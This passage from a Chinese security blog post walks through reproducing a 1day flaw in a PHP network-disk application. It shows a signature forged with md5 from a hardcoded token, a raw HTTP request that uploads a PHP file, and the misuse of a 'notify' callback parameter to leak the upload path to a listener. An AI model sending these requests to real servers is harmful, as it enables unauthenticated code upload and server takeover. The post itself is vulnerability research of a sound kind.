+<p>那么在这里我们就尝试进行复现，当刚打开BP我就发现问题了，emmm在上述的demo中我是写死了拼接的字符串的，但是远程是<code>$this-&gt;config[&#39;token&#39;]</code>​ 拼接这个东西啊，所以跟进一下这个<code>$config</code>​的内容，发现在最下面就定义了token的内容为<code>asdasfasfasfasfasfa</code>​</p>
+<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401081933889.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>那么就可以直接生成<code>sign</code>​了</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-string">&quot;md=upload&amp;uid=1asdasfasfasfasfasfa&quot;</span>);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>那么继续复现</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">POST /server/index.php/start?md=upload&amp;uid=1&amp;sign=e8766abd8742eb67a2c07b089ecf636a HTTP/1.1<br>Host: wp.com<br>Cache-Control: no-cache<br>Accept: */*<br>Accept-Encoding: gzip, deflate, br<br>Content-Type: multipart/form-data; boundary=--------------------------570796120375390059114427<br>User-Agent: PostmanRuntime-ApipostRuntime/1.1.0<br>Content-Length: 389<br><br>----------------------------570796120375390059114427<br>Content-Disposition: form-data; name=<span class="hljs-string">&quot;file&quot;</span>; filename=<span class="hljs-string">&quot;1.php&quot;</span><br>Content-Type: application/x-httpd-php<br><br>&lt;?php phpinfo(); ?&gt;<br>----------------------------570796120375390059114427--<br></code></pre></td></tr></table></figure>
+
+<p>上传后返回如下</p>
+<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401081933013.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>解码后为 同步错误</p>
+<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401081933171.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>‍</p>
+<p>来看看源码</p>
+<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401081933287.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>发现已经上传了，但是咱不知道上传路径啊。。。找一下本地可以发现在这里</p>
+<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401081933438.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>‍</p>
+<p>但是如何找路径呢，可以关注到后续还有一串代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$res</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">upload_notify</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;notify&#x27;</span>],<span class="hljs-variable">$info</span>);<br></code></pre></td></tr></table></figure>
+
+<p>我将<code>$info</code>​打印了下发现已经存入了上传的路径了</p>
+<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401081933559.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>跟进下<code>upload_notify</code>​ 发现跟SSRF一样可以向外请求并且带上我们的<code>$info</code>​ ——–&gt; 这感觉写的就怕我找不到路径似的,这里的验签压根就不需要管他，因为文件都传上去了，无所谓了，只需要路径，而他也并没有判断验签对不对(如果校验了，就没办法上传了，因为<code>$info</code>​是未知的)</p>
+<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401081930201.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>于是带好参数写好验签即可成功触发</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-string">&quot;md=upload&amp;notify=http://127.0.0.1:8877/&amp;uid=1asdasfasfasfasfasfa&quot;</span>);<br></code></pre></td></tr></table></figure>
+
+<p>‍</p>
+<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401070009584.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>‍</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs xml">POST /server/index.php/start?md=upload&amp;uid=1&amp;notify=http://127.0.0.1:8877/&amp;sign=88c03d47ed5a1df9ed7ed9e1c1ce8afd HTTP/1.1<br>Host: wp.com<br>Cache-Control: no-cache<br>Accept: */*<br>Accept-Encoding: gzip, deflate, br<br>Content-Type: multipart/form-data; boundary=--------------------------570796120375390059114427<br>User-Agent: PostmanRuntime-ApipostRuntime/1.1.0<br>Content-Length: 389<br><br>----------------------------570796120375390059114427<br>Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;1.php&quot;<br>Content-Type: application/x-httpd-php<br><br><span class="hljs-meta">&lt;?php phpinfo(); ?&gt;</span><br>----------------------------570796120375390059114427--<br></code></pre></td></tr></table></figure>
+
+<p>‍</p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ol>
+<li>多扣代码多调试才行，一步一步来</li>
+<li>有些时候框架忘记或者不熟悉还是要多仔细看看才行</li>
+</ol>
+<p>‍</p>
+<p>‍</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>代码审计 - PHP - 某网盘1day分析</div>
+      <div>https://zjackky.github.io/post/code-audit-php-network-disk-1day-analysis-duplicated-20240108-19-32-53-1i9ljt.html</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Zjacky</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年1月6日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/post/penetration-js-login-encryption-z1vcpbk.html" title="渗透 - JS - 登录加密">
+                        <span class="hidden-mobile">渗透 - JS - 登录加密</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://github.com/Zjackky/Zjackky.github.io" target="_blank" rel="nofollow noopener"><span>My Github</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> <div style="font-size: 0.85rem"> <span id="timeDate">载入天数...</span> <span id="times">载入时分秒...</span> <script src="/js/duration.js"></script> </div> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+  
+</div>
+
+  
+  
+  
+</div>
+
+
+<style>
+.copyright{line-height:24px}
+</style>
+<div class="copyright">
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
